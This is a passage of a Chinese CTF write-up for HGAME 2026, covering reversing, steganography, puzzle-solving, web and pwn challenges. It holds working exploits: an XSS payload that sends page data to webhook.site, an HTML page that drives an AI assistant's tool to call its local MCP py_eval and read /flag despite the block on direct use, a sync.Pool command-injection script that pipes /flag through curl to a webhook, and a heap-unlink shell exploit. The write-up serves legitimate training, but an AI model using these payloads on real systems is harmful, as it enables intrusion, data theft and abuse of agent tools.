def derive_aes_key(nonce16: bytes, secret32: bytes) -> bytes:
    k1 = hmac.new(b"\x00" * 32, nonce16, hashlib.sha256).digest()
    k2 = hmac.new(k1, secret32 + b"\x01", hashlib.sha256).digest()
    return k2[:16]

def inverse_client_vm(transformed: bytes) -> bytes:
    """
    逆 client 的按位置变换：
    out = ROL8(in ^ (13*i+195), (3*i+1)&7) ^ 0x5a
    """
    out = bytearray()
    for i, b in enumerate(transformed):
        b2 = (13 * i + 195) & 0xFF
        shift = (3 * i + 1) & 7
        x = b ^ 0x5A
        x = ror8(x, shift)
        out.append(x ^ b2)
    return bytes(out)

def main():
    blob = Path("Drv_blob.bin").read_bytes()
    nonce = blob[:16]
    ct = blob[16:]

    secret = derive_secret_from_driver("GateDriver.sys")
    aes_key = derive_aes_key(nonce, secret)

    pt_padded = AES.new(aes_key, AES.MODE_ECB).decrypt(ct)
    pt = pkcs7_unpad(pt_padded)

    flag = inverse_client_vm(pt).decode("ascii")
    print(flag)

if __name__ == "__main__":
    main()
```

把三个文件和脚本放同目录，直接运行即可输出 flag。

------

### 3) 最终答案

**`hgame{n0w_y9u_2_a_n0nces3nser_9f3a1c0e7b2d4a8c1e3f5a7b}`**





## **shiori不想找女友**

eXIf 块，长度: 222 内容 (String): MM *  i           (UNICODE { " b l o c k " :  1 ,  " s t a r t _ x " :  1 0 ,  " s t a r t _ y " :  1 0 ,  " s t e p _ x " :  7 ,  " s t e p _ y " :  7 ,  " c o l u m n _ n u m " :  4 5 0 }

图片还有黑白点，还原一下

```
import json
import re
import math
from pathlib import Path

import numpy as np
from PIL import Image


def extract_exif_json(png_path: Path):
    data = png_path.read_bytes()

    marker = b"UNICODE\x00\x00"
    idx = data.find(marker)
    if idx == -1:
        raise RuntimeError("没找到 UNICODE\\x00\\x00（eXIf UserComment）标记，无法自动取参数。")

    tail = data[idx + len(marker):]

    # UTF-16BE 下 '{' 是 00 7B，'}' 是 00 7D
    l = tail.find(b"\x00{")
    if l == -1:
        raise RuntimeError("在 UNICODE 段里没找到 UTF-16BE 的 '{' (00 7B)。")

    r = tail.find(b"\x00}", l)
    if r == -1:
        raise RuntimeError("在 UNICODE 段里没找到 UTF-16BE 的 '}' (00 7D)。")

    blob = tail[l : r + 2]  # 包含 '}' 这两个字节

    # 长度必须是偶数（UTF-16 每字符2字节）
    if len(blob) % 2 != 0:
        blob = blob[:-1]

    js = blob.decode("utf-16-be", errors="strict")

    # 保险：去掉可能出现的 \x00
    js = js.replace("\x00", "").strip()

    try:
        return json.loads(js)
    except Exception as e:
        print("[!] 提取到的 JSON 文本如下（用于排错）：")
        print(repr(js))
        raise



def sample_values(img_arr, start_x, start_y, step_x, step_y, order="yx", mode="gray", channel=2):
    h, w = img_arr.shape[:2]
    xs = list(range(start_x, w, step_x))
    ys = list(range(start_y, h, step_y))

    vals = []
    if order == "yx":
        for y in ys:
            for x in xs:
                r, g, b = img_arr[y, x]
                if mode == "gray":
                    v = int(round(0.299*r + 0.587*g + 0.114*b))
                else:
                    v = int((r, g, b)[channel])
                vals.append(v)
    else:  # "xy"
        for x in xs:
            for y in ys:
                r, g, b = img_arr[y, x]
                if mode == "gray":
                    v = int(round(0.299*r + 0.587*g + 0.114*b))
                else:
                    v = int((r, g, b)[channel])
                vals.append(v)

    return np.array(vals, dtype=np.uint8)


def reshape_to_image(values, width):
    n = (len(values) // width) * width
    values = values[:n]
    height = n // width
    return values.reshape((height, width))


def bits_to_bytes(bits):
    n = (len(bits) // 8) * 8
    bits = bits[:n]
    out = bytearray()
    for i in range(0, n, 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | int(bits[i + j])
        out.append(byte)
    return bytes(out)


def main():
    # 固定读取脚本同目录下的 shiori.png
    base_dir = Path(__file__).resolve().parent
    png_path = base_dir / "shiori.png"
    if not png_path.exists():
        raise FileNotFoundError(f"找不到文件：{png_path}")

    outdir = base_dir / "out_rebuild"
    outdir.mkdir(parents=True, exist_ok=True)

    params = {"block": 1, "start_x": 10, "start_y": 10, "step_x": 7, "step_y": 7, "column_num": 450}

    print("[+] exif json:", params)

    start_x = int(params.get("start_x", 10))
    start_y = int(params.get("start_y", 10))
    step_x  = int(params.get("step_x", 7))
    step_y  = int(params.get("step_y", 7))
    colnum  = int(params.get("column_num", 450))

    img = Image.open(png_path).convert("RGB")
    arr = np.array(img)

    # 1) 灰度重建
    for order in ["yx", "xy"]:
        vals = sample_values(arr, start_x, start_y, step_x, step_y, order=order, mode="gray")
        mat = reshape_to_image(vals, colnum)
        Image.fromarray(mat, mode="L").save(outdir / f"rebuild_gray_{order}_w{colnum}.png")
        print(f"[+] saved rebuild_gray_{order}_w{colnum}.png  shape={mat.shape}")

    # 2) 单通道重建
    for order in ["yx", "xy"]:
        for ch, name in [(0, "R"), (1, "G"), (2, "B")]:
            vals = sample_values(arr, start_x, start_y, step_x, step_y, order=order, mode="ch", channel=ch)
            mat = reshape_to_image(vals, colnum)
            Image.fromarray(mat, mode="L").save(outdir / f"rebuild_{name}_{order}_w{colnum}.png")

    # 3) 位平面导出 + bin
    for order in ["yx", "xy"]:
        vals = sample_values(arr, start_x, start_y, step_x, step_y, order=order, mode="gray")
        for bit in range(8):
            bits = ((vals >> bit) & 1).astype(np.uint8)
            mat = reshape_to_image(bits * 255, colnum)
            Image.fromarray(mat, mode="L").save(outdir / f"rebuild_bit{bit}_{order}_w{colnum}.png")

            raw_bits = ((vals >> bit) & 1).tolist()
            b = bits_to_bytes(raw_bits)
            (outdir / f"bit{bit}_{order}.bin").write_bytes(b)

    print("[+] done. check:", outdir)


if __name__ == "__main__":
    main()

```

得到的图片

![rebuild_gray_yx_w450](D:\CTF-competition\2026-HGAME\tmp\out_rebuild\rebuild_gray_yx_w450.png)

转小写解压

得到的图片转一下lsb看就行

![image-20260202163558372](C:\Users\HONOR\AppData\Roaming\Typora\typora-user-images\image-20260202163558372.png)





## **魔理沙的魔法目录**

抓包改时间

POST /record HTTP/1.1
Host: cloud-big.hgame.vidar.club:31624
Content-Length: 16
Authorization: 527955d7-d3d1-4cce-aa89-5911277ab6fc
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://cloud-big.hgame.vidar.club:31624
Referer: http://cloud-big.hgame.vidar.club:31624/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"time":1000000}



就行了

## **博丽神社的绘马挂**

admin 11111登录（我真没爆破第一个输的就是这个然后过了。。

抓归档

```
<img src=1 onerror="fetch('archives.html').then(r=>r.text()).then(h=>{fetch('https://webhook.site/72542378-aebf-419f-a03b-9457cf032559',{method:'POST',body:h})})">
```



```
        <h3 style="color:#555; border-left:4px solid #ccc; padding-left:10px; margin-top:30px;">
            🗃️ 我的归档记录
        </h3>
        
        <div id="archive-list"><div class="card">
                    <div class="meta">
                        <span class="user-name">Reimu</span> 
                        <span>2024-01-01 00:00:00</span>
                    </div>
                    <div>The_Secret_Is: Hgame{tH3_53creT-0F-h4KUR3i_jlnJ4d88f2aa}</div>
                </div></div>
    </div>

    <script src="js/main.js"></script>
    <script>
```

下面给你一份可直接发到博客/Writeup 平台的题解（含思路 + 关键逆向点 + 求解脚本 + 最终 flag）。我按你题面“静态分析”的要求写，重点放在：VM 指令集、华容道状态表示、BFS 最短路、以及最后“节点值”格式坑。

------

## 看不懂的华容道 

- 给 `exe` 和 `game.bin`
- 是一个“看不懂的华容道”
- **flag 内容为最短路径下的终点对应的节点值**
- 操作路径：按棋子编号从小到大，操作顺序 `wasd`

------

1. 入口与 game.bin 的作用

`main` 逻辑（简化）：

- `argc == 2` 才进入正常流程
- `load(vm, argv[1])` 读取 game.bin
- 执行 `sub_1400112E9(vm)`（实际是 VM 解释器）

`load()` 的核心：

```cpp
std::istream::read(v8, a1 + 160, 0x8000);
```

说明 **game.bin 没有额外解密**，而是直接被读入到 `vm_base + 0xA0`，作为 VM 的“内存/字节码区”运行。

------

2. VM 解释器与指令集恢复

解释器主循环：

- `pc` 在 `a1 + 128`
- 取指：`op = *(a1 + 160 + pc)`，`pc++`
- `R0..R19` 在 `a1 + 8*i`（`i < 0x14`）
- 运行标志在 `a1 + 65696`

重点 opcode（从 switch 直接读出来）：

- `0x15`：读入一行输入，取前 1~2 字节拼成 16-bit，写入寄存器
- `0x16`：调用 native 函数 `sub_140011212(a1)`（刷新/生成 board）
- `0x18`：对 board + salt 求 hash，结果存到 `a1+64`、`a1+72`
- `0x17`：把 `a1+72`、`a1+64` 用 hex 输出（关键坑！）
- `0xFF`：停止

以及一些 MOV/算术/条件跳转，用于实现华容道规则判定（静态推导即可，不必须全部模拟）。

------

3. 输入格式：棋子编号 + wasd

`0x15` 指令只取输入前 1~2 字符：

- 若长度为 2：`v48 = (s[0]<<8) | s[1]`

而 game.bin 字节码中会把高字节当作数字字符 `'0'..'9'`，低字节与 `'w'/'a'/'s'/'d'` 比较。

所以每步输入形如：

- `0w`、`4s`、`9a` 等

并且题面规定枚举邻居顺序：

- **棋子编号从小到大**
- **方向顺序 wasd**

------

4. 华容道棋子类型与状态表示

从字节码可推出棋子形状（用 bitmask 表示）：

- `0`：2×2（曹操）mask `0x33`
- `1..4`：竖 2×1 mask `0x11`
- `5`：横 1×2 mask `0x03`
- `6..9`：1×1 mask `0x01`

棋盘大小为 4×5，共 20 格。

初始每个棋子的 **top-left 坐标（0..19）** 在字节码里被写成：

```
0:1  1:0  2:3  3:11  4:10  5:8  6:12  7:16  8:13  9:19
```

对应盘面：

```
1 0 0 2
1 0 0 2
5 5 4 3
6 8 4 3
7 . . 9
```

------

5. 最短路：BFS（按题面规定的邻居枚举顺序）

目标：曹操（piece 0）移动到出口位置。

从棋盘 4×5 可知曹操 2×2 的合法 top-left。题目出口对应 bottom-middle（经典华容道），静态推导目标为：

- `getpos(0) == 13`

也就是曹操占据格子 13、14、17、18。

用 BFS 搜索状态空间：

- 状态 = 10 个棋子 top-left（每个 0..19，用 5 bit 存）
- `key = Σ pos[i] << (5*i)`
- 同时维护 `occ` 20-bit 占用位图用于快速碰撞判断
- 扩展邻居顺序严格按：`pid = 0..9`，dir = `w,a,s,d`

BFS 的最短路径长度为 103。

------

6. “节点值”到底是什么：不是 MD5 hex，而是程序打印的两个 u64 拼接

native 函数 `sub_140011212(a1)`（VM 的 `0x16`）负责生成 `board[20]`：

- 先把 20 格全部置为 `255 (0xFF)`
- 再把各棋子占的格子写成棋子编号 `0..9`
- 最终写入：`a1 + 160 + 80`（即 board）

`0x18` 会对：

```
board[20] + "HuarongDao2026_Salt"
```

做 MD5（`sub_140011177 -> sub_14001C650` 是标准 MD5 实现），得到 16 字节 digest。

**关键坑在 0x17 的输出**：

- `sub_140011947()` 把 cout 设为 **hex** 输出
- 它输出的是：
  1. `*(uint64_t*)(a1+72)`（digest 后 8 字节按 little-endian 解释）
  2. `*(uint64_t*)(a1+64)`（digest 前 8 字节按 little-endian 解释）
- **没有分隔符，不补前导 0**

因此最终“节点值”应按程序打印格式，而不是 MD5 的 32 位 hexdigest。

------

### 解题脚本（BFS 求最短路 + 计算最终节点值）

下面脚本是你最终可复现的求解代码（C++，与题面一致，输出 103 步路径与终点状态）：

```cpp
#include <bits/stdc++.h>
using namespace std;

static const int W=4, H=5, N=W*H;

int main(){
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    // base masks at position 0
    uint32_t base[10];
    base[0]=0x33; // 2x2
    for(int i=1;i<=4;i++) base[i]=0x11; // vertical 2x1
    base[5]=0x03; // horizontal 1x2
    for(int i=6;i<10;i++) base[i]=0x01; // single

    bool valid[10][N];
    uint32_t mask[10][N];
    int dest[10][N][4]; // wasd => w,a,s,d
    memset(valid,0,sizeof(valid));
    memset(mask,0,sizeof(mask));
    for(int pid=0;pid<10;pid++){
        int width = (pid==0||pid==5)?2:1;
        int height = (pid==0||(pid>=1&&pid<=4))?2:1;
        for(int pos=0;pos<N;pos++){
            int r=pos/W, c=pos%W;
            if(c+width<=W && r+height<=H){
                valid[pid][pos]=true;
                mask[pid][pos]=base[pid] << pos;
            }
        }
        for(int pos=0;pos<N;pos++) for(int d=0;d<4;d++) dest[pid][pos][d]=-1;
        for(int pos=0;pos<N;pos++) if(valid[pid][pos]){
            int r=pos/W, c=pos%W;
            if(r>0 && valid[pid][pos-W]) dest[pid][pos][0]=pos-W;     // w
            if(c>0 && valid[pid][pos-1]) dest[pid][pos][1]=pos-1;     // a
            if(valid[pid][pos+W] && r < H-((pid==0||(pid>=1&&pid<=4))?2:1)) dest[pid][pos][2]=pos+W; // s
            if(valid[pid][pos+1] && c < W-((pid==0||pid==5)?2:1)) dest[pid][pos][3]=pos+1;          // d
        }
    }

    auto pack = [&](array<int,10> p){
        uint64_t k=0;
        for(int i=0;i<10;i++) k |= (uint64_t)p[i] << (5*i);
        return k;
    };
    auto getpos = [&](uint64_t k,int pid){
        return (int)((k >> (5*pid)) & 0x1FULL);
    };
    auto occ_from_key = [&](uint64_t k){
        uint32_t o=0;
        for(int pid=0;pid<10;pid++){
            int pos=getpos(k,pid);
            o |= mask[pid][pos];
        }
        return o;
    };

    array<int,10> startp = {1,0,3,11,10,8,12,16,13,19};
    uint64_t start = pack(startp);
    uint32_t start_occ = occ_from_key(start);

    auto is_goal = [&](uint64_t k){
        return getpos(k,0)==13;
    };

    vector<uint64_t> keys; keys.reserve(2000000);
    vector<uint32_t> occs; occs.reserve(2000000);
    vector<int> prev; prev.reserve(2000000);
    vector<uint16_t> mv; mv.reserve(2000000);

    keys.push_back(start);
    occs.push_back(start_occ);
    prev.push_back(-1);
    mv.push_back(0xffff);

    unordered_map<uint64_t,int> idx;
    idx.reserve(2000000);
    idx.max_load_factor(0.7);
    idx[start]=0;

    size_t head=0;
    int goal_idx=-1;

    while(head < keys.size()){
        uint64_t k = keys[head];
        uint32_t occ = occs[head];
        if(is_goal(k)) { goal_idx=(int)head; break; }

        // neighbor order: piece 0..9, dir w,a,s,d
        for(int pid=0;pid<10;pid++){
            int pos = getpos(k,pid);
            uint32_t mcur = mask[pid][pos];
            uint32_t occ_wo = occ ^ mcur;

            for(int di=0;di<4;di++){
                int np = dest[pid][pos][di];
                if(np<0) continue;
                uint32_t md = mask[pid][np];
                if(md & occ_wo) continue;

                uint64_t nk = k & ~(0x1FULL << (5*pid));
                nk |= ((uint64_t)np << (5*pid));

                if(idx.find(nk)!=idx.end()) continue;

                int ni=(int)keys.size();
                idx[nk]=ni;
                keys.push_back(nk);
                occs.push_back(occ_wo ^ md);
                prev.push_back((int)head);
                mv.push_back((uint16_t)(pid*4+di));
            }
        }
        head++;
    }

    if(goal_idx<0){
        cerr << "No goal found. Visited="<<keys.size()<<"\n";
        return 1;
    }

    // reconstruct path
    vector<string> path;
    static const char dch[4]={'w','a','s','d'};
    int cur=goal_idx;
    while(prev[cur]!=-1){
        uint16_t code=mv[cur];
        int pid=code/4, di=code%4;
        string s; s.push_back('0'+pid); s.push_back(dch[di]);
        path.push_back(s);
        cur=prev[cur];
    }
    reverse(path.begin(), path.end());

    cout << "moves="<<path.size()<<" visited="<<keys.size()<<"\n";
    for(size_t i=0;i<path.size();i++){
        cout<<path[i]<<(i+1<path.size()?" ":"\n");
    }
    uint64_t gk = keys[goal_idx];
    cout<<"goal key="<<gk<<"\n";
    for(int pid=0;pid<10;pid++){
        cout<<pid<<":"<<getpos(gk,pid)<<(pid==9?'\n':' ');
    }
    return 0;
}
```

输出

```
moves=103 visited=6615627
4s 5d 1s 7d 6s 1s 0a 2a 3w 3w 9w 9w 4d 7d 6d 1s 5a 2s 2s 3a 9w 4w 7d 2s 3s 9w 4w 7w 9a 4w 7w 2d 3s 3s 7a 7w 5d 1w 5d 6a 8s 1d 6w 8a 1s 5a 4s 5a 3w 9d 7w 3w 1d 6d 6s 5s 0s 7a 7a 9a 4w 2w 9a 3w 1w 6d 6d 8d 8d 5s 0s 7s 9a 3a 1w 1w 0d 7s 7s 9s 9s 3a 1a 4a 2w 2w 0d 7d 7w 5w 8a 6a 8a 6a 0s 7d 7d 9d 9d 5w 6w 6a 0a
goal key=369827019492397
0:13 1:1 2:3 3:0 4:2 5:8 6:12 7:11 8:16 9:10
```



（上面输出的最短路径与你跑出来的 103 步一致。）

终点状态生成的 `board[20]`（按程序 `sub_14001EC40`）为：

```
03 01 04 02 03 01 04 02 05 05 09 07 06 00 00 FF 08 00 00 FF
```

对 `board + "HuarongDao2026_Salt"` 做 MD5 得：

- digest(hex) = `fa7f31bb875b8752854fd349e18a4a0c`

但最终打印的“节点值”是：

- u64(hex) 后半：`c4a8ae149d34f85`（无前导 0）
- u64(hex) 前半：`52875b87bb317ffa`

拼接：

**`c4a8ae149d34f8552875b87bb317ffa`**

**hgame{c4a8ae149d34f8552875b87bb317ffa}**

## **My Little Assistant**

题目给的脚本是在本地8001端口起的服务

直接让ai用py_eval会提示禁用

猜测是/execute_tool有进行处理

但是可以服务器开服务然后py_request访问，直接调用mcp获取flag

```
<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
    <script>
        async function pwn() {
            const target = 'http://127.0.0.1:8001/mcp';
            const payload = {
                "params": {
                    "name": "py_eval",
                    "arguments": {
                        // 尝试读取根目录下的 flag
                        "code": "import os; result_val = os.popen('cat /flag || cat /flag.txt || ls /').read()"
                    }
                },
                "id": "pwned"
            };

            try {
                const response = await fetch(target, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await response.json();
                // 关键：将结果写入 DOM，py_request 会读取 page.content()
                document.body.innerText = "PWN_RESULT: " + JSON.stringify(data);
            } catch (e) {
                document.body.innerText = "ERROR: " + e.message;
            }
        }
        pwn();
    </script>
</body>
</html>
```

返回

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.10.12
Date: Mon, 02 Feb 2026 13:08:04 GMT
Content-Type: application/json
Content-Length: 465
Connection: close

{"code":1,"result":"{\"status_code\": 200, \"content\": \"<!DOCTYPE html><html><head><title>Exploit</title></head>\\n<body>PWN_RESULT: {\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":\\\"pwned\\\",\\\"result\\\":{\\\"content\\\":[{\\\"type\\\":\\\"text\\\",\\\"text\\\":\\\"{\\\\\\\"result\\\\\\\": \\\\\\\"{'os': &lt;module 'os' from '/usr/lib/python3.10/os.py'&gt;, 'result_val': 'hgame{@imCp_dRIvEN_Xss-@ttAck_chAiN46c01c4}\\\\\\\\\\\\\\\\n'}\\\\\\\", \\\\\\\"stat\"}"}

```

## monitor

脏对象复用

### 攻击思路

1. **漏洞点**：`UserCmd` 函数中，如果 JSON 解析报错（例如类型不匹配），`monitor.reset()` 不会被执行，但对象会被放回池子（`MonitorPool.Put`）。
2. **污染方式**：我们发送一个 JSON，**先**包含恶意的 `args`，**后**包含错误的 `cmd`（比如用数字代替字符串）。这样 Go 在解析时会先把 `Args` 赋值，读到 `Cmd` 时报错退出，留下一个脏对象。
3. **触发**：后台 Bot（Admin）定期从池子里拿对象，只发送 `{"cmd": "ls"}`。因为缺少 `args` 字段，Bot 会复用我们留下的恶意 `args`。
4. **执行**：后端拼接 `fmt.Sprintf("%s %s", "ls", 恶意args)` 并执行，从而回传 Flag。

### 攻击脚本 (Python)

请直接运行以下脚本。脚本会自动注册、登录，并开始高频污染对象池。

**注意**：Go 的 JSON 解析顺序很重要，为了确保 `args` 在 `cmd` 报错之前被解析进去，我在脚本中**强制了 JSON 字段的顺序**。

Python

```
import requests
import time
import threading
import sys

# === 配置 ===
BASE_URL = "http://cloud-middle.hgame.vidar.club:30405"
WEBHOOK = "https://webhook.site/f736b3cf-4443-4ec0-9edd-61f817aabdd0"

# 恶意 Payload
# Bot 执行的是: bash -c "ls <args>"
# 我们注入 args 为: ; cat /flag | base64 | curl -d @- <webhook>
# Base64 编码 flag 防止特殊字符导致 curl 失败
SHELL_CMD = f"; cat /flag | base64 | curl -d @- {WEBHOOK}"

def get_token():
    """注册一个随机账号并获取 Token"""
    username = f"hacker_{int(time.time())}_{sys.argv[-1] if len(sys.argv)>1 else 0}"
    password = "password123"
    
    print(f"[*] Registering user: {username}...")
    try:
        # 尝试注册
        res = requests.post(f"{BASE_URL}/api/account/register", json={
            "username": username,
            "password": password
        })
        data = res.json()
        if "Authorization" in data:
            return data["Authorization"]
            
        # 注册失败尝试登录
        res = requests.post(f"{BASE_URL}/api/account/login", json={
            "username": username,
            "password": password
        })
        return res.json()["Authorization"]
    except Exception as e:
        print(f"[!] Login/Register failed: {e}")
        return None

def attack(token):
    """发送恶意包污染 sync.Pool"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    
    # 手动构造 JSON 字符串以保证顺序：先 args 后 cmd
    # cmd 设为整数 1，导致 Go 解析器报错 "expected string"，从而跳过 reset()
    raw_payload = '{"args": "%s", "cmd": 1}' % SHELL_CMD
    
    print("[*] Starting pool pollution... Press Ctrl+C to stop.")
    count = 0
    while True:
        try:
            # 发送到 /api/user/cmd
            # 这里预期返回 400 Error，因为 cmd 类型错误，但这正是我们要的
            requests.post(f"{BASE_URL}/api/user/cmd", data=raw_payload, headers=headers, timeout=1)
            count += 1
            if count % 50 == 0:
                print(f"[*] Sent {count} pollution packets...")
            
            # 稍微 sleep 一点点，给 Bot 留出获取脏对象的时间窗口
            # 频率太快可能导致自己一直抢占到脏对象
            time.sleep(0.05) 
        except Exception:
            pass

if __name__ == "__main__":
    token = get_token()
    if not token:
        print("[!] Could not get token.")
        sys.exit(1)
    
    print(f"[*] Token obtained. Target: {BASE_URL}")
    print(f"[*] Webhook: {WEBHOOK}")
    
    # 开启 5 个线程并发攻击，提高命中率
    threads = []
    for i in range(5):
        t = threading.Thread(target=attack, args=(token,))
        t.daemon = True
        t.start()
        threads.append(t)
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Attack stopped.")
```

解码base64

hgame{r3MEMbER-TO-cl3ar_THE_BuFfer-6eFOrE-YoU_W@NT-to-Use!!!0}

## **Heap1sEz**

### 利用路线

1. **malloc 两块**：保证第 0 块 free 时 nextchunk 不是 top（否则会并入 top，不进 bin，就没 fd/bk 可泄露/利用）。
2. `free(0)` 后 `show(0)`：打印的字符串开头就是 `fd` 指针（指向 bin header，在 PIE 的 .bss 里），因此可泄露 **PIE 基址**。
3. 用 UAF `edit(0)` 把 free chunk 的 `fd/bk` 改成：
   - `fd = &notes[0] - 0x18`
   - `bk = &notes[0] - 0x10`
     触发 malloc unlink 时，会把 `notes[0]` 改成 `&notes[0] - 0x18`（即落在 note_size/notes 附近的 .bss），从而让 index0 变成一个“写 .bss 的笔”。
4. `edit(0)` 往 .bss 写，把 `notes[1] = puts@GOT`。
5. `show(1)` 泄露 `puts` 实际地址 → 算 libc 基址。
6. 菜单 6：`gift(system)` 写 hook = system。
7. 再 malloc 一块写入 `"/bin/sh\x00"`，`delete()` 触发 `system("/bin/sh")`。

### 解题脚本

```
#!/usr/bin/env python3
from pwn import *
import os

context(os='linux', arch='amd64')
context.log_level = 'info'

HOST = 'cloud-middle.hgame.vidar.club'
PORT = 31190

elf  = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

sizes = {}

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([elf.path], env={'LD_PRELOAD': libc.path})

def sync_menu(io):
    io.recvuntil(b'>\n')

def add(io, idx, sz):
    io.sendline(b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ',  str(sz).encode())
    sizes[idx] = sz
    sync_menu(io)

def delete(io, idx, do_sync=True):
    io.sendline(b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())
    if do_sync:
        sync_menu(io)

def edit(io, idx, data):
    io.sendline(b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendafter(b'Content: ', data.ljust(sizes[idx], b'\x00'))
    sync_menu(io)

def show(io, idx):
    io.sendline(b'4')
    io.sendlineafter(b'Index: ', str(idx).encode())
    blob = io.recvuntil(b'>\n')
    marker = b'welcome to evil crop database.'
    pre = blob.split(marker, 1)[0]
    leak = pre.rsplit(b'\n', 1)[0]
    return leak

def gift(io, addr):
    io.sendline(b'6')
    io.sendlineafter(b'give me a hook\n', hex(addr).encode())
    sync_menu(io)

def main():
    io = start()
    sync_menu(io)

    # layout
    add(io, 0, 0x100)
    add(io, 1, 0x100)
    delete(io, 0)

    # leak PIE via unsorted fd -> bin header in .bss
    leak = show(io, 0)
    leak_fd = u64(leak.ljust(8, b'\x00'))

    binhdr_off = elf.symbols['main_arena'] - 8
    pie_base = leak_fd - binhdr_off
    elf.address = pie_base
    log.success(f'PIE base = {hex(pie_base)}')

    notes_addr = elf.symbols['notes']
    log.info(f'notes = {hex(notes_addr)}')

    # unsafe unlink: overwrite freed chunk fd/bk
    fd = notes_addr - 0x18
    bk = notes_addr - 0x10
    payload = p64(fd) + p64(bk) + b'A' * (0x100 - 16)
    edit(io, 0, payload)

    # trigger unlink
    add(io, 2, 0x100)
    bss_start = notes_addr - 0x18
    log.success(f'notes[0] now should point to BSS: {hex(bss_start)}')

    got_puts = elf.got['puts']
    log.info(f'puts@GOT = {hex(got_puts)}')

    # keep notes[0] pointing to bss_start, set notes[1]=puts@got
    b = bytearray(b'\x00' * 0x100)
    b[0x18:0x20] = p64(bss_start)
    b[0x20:0x28] = p64(got_puts)
    edit(io, 0, bytes(b))

    # leak libc
    leak_puts = show(io, 1)
    puts_addr = u64(leak_puts.ljust(8, b'\x00'))
    libc_base = puts_addr - libc.sym['puts']   # 注意：这里 libc.address 还没设置，所以 sym 是偏移
    libc.address = libc_base
    log.success(f'puts = {hex(puts_addr)}')
    log.success(f'libc base = {hex(libc.address)}')

    # FIX 1: system 已经是绝对地址了，别再 + libc.address
    system_addr = libc.sym['system']
    log.success(f'system = {hex(system_addr)}')

    # write hook
    gift(io, system_addr)

    # get shell
    add(io, 3, 0x40)
    edit(io, 3, b'/bin/sh\x00')

    # FIX 2: 这里不要再 sync_menu，直接进交互
    delete(io, 3, do_sync=False)
    io.interactive()

if __name__ == '__main__':
    main()

```





```
(latt) ➜  pwn python so.py REMOTE
/home/mxym/miniconda/envs/latt/lib/python3.11/site-packages/unicorn/unicorn_py3/unicorn.py:123: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
[+] Opening connection to cloud-middle.hgame.vidar.club on port 31190: Done
[+] PIE base = 0x55a3fd4e8000
[*] notes = 0x55a3fd4eb880
[+] notes[0] now should point to BSS: 0x55a3fd4eb868
[*] puts@GOT = 0x55a3fd4eb768
[+] puts = 0x7f1e8549de50
[+] libc base = 0x7f1e8541d000
[+] system = 0x7f1e8546dd70
[*] Switching to interactive mode
$ ls
bin
dev
flag
lib
lib32
lib64
libc.so.6
libexec
libx32
vuln
$ cat flag
hgame{RE4dy_for_MoRe-dlfFIcULt-m@IIoC?5976d}
$
```

## **Producer and Consumer**

### 1. 解题思路

程序启动会输出：

```
a gift for you:0xXXXXXXXX
```

这是一个 **heap 地址泄露**

菜单：

1. produce
2. consume
3. exit

从行为来看，是一个生产者-消费者模型（线程 + 信号量），数据写入一个全局 buffer（在堆上）。

------

####  核心漏洞：退出时 memcpy 栈溢出（长度由竞态控制）

程序在 `exit` 时会先打印：

```
buffer data:
<0x40 bytes dump>
```

然后发生关键点：它会把 `buffer` 拷贝到栈上一个固定大小的局部数组（0x40 字节），但是**拷贝长度**来自全局 `prod_idx * 8`，而 `prod_idx` 的维护存在逻辑/竞态问题，使得 `prod_idx` 最终能到 **10**：

- 局部数组大小：0x40（64 字节）
- 若 `prod_idx = 10`，拷贝长度：`10 * 8 = 0x50`
- `0x50 > 0x40` ⇒ 覆盖：
  - saved RBP（8字节）
  - saved RIP（8字节）
- **无 canary** ⇒ 直接控制返回地址

为何 `prod_idx` 能到 10？

- producer 线程对 `prod_idx` 的检查与更新存在“检查-使用”窗口（竞态）
- 在 `prod_idx==7` 时快速启动多个 producer，多个线程都会通过检查，结束时连续推进 `prod_idx` 到 8、9、10
  （你跑脚本时也能观察到多次 “has been produced.” 输出）

------

#### 由于溢出空间很小：用 `leave; ret` 做二次栈迁移到堆

我们最多能覆盖到 RIP，但无法在原栈上放完整 ROP 链，所以采用 **stack pivot**：

1. 利用 `gift` 泄露的堆地址，算出 `buffer` 的地址（题目里是 `gift + 0x1800`）
2. 让溢出覆盖：
   - saved RBP = `buffer`
   - saved RIP = `leave; ret`
3. 函数 epilogue 执行 `leave` 会把 `rsp` 切到我们写的 `buffer`，然后 `ret` 开始从堆上执行 ROP（堆当 fake stack）

------

#### 两阶段 ROP：先泄露 libc，再 system("/bin/sh")

因为远程给了 `libc-2.31.so`，可以走经典两阶段：

**Stage 1：泄露 libc**

- ROP：`puts(puts@GOT)` 泄露 puts 实际地址
- 计算 `libc_base = leaked_puts - libc.sym['puts']`
- 返回 main 再跑一轮菜单

**Stage 2：getshell**

- ROP：`system("/bin/sh")`



解题脚本

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

context(os="linux", arch="amd64")
context.log_level = "debug"

HOST, PORT = "cloud-middle.hgame.vidar.club", 32027

BIN  = "./vuln"         
LD   = "./ld-2.31.so"
LIBC = "./libc-2.31.so"

elf  = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False)

# 固定地址（No PIE）
# pop rdi; ret 是从 0x401962 的 pop r15;ret 中间切出来的（0x401963: 5f c3）
POP_RDI   = 0x401963
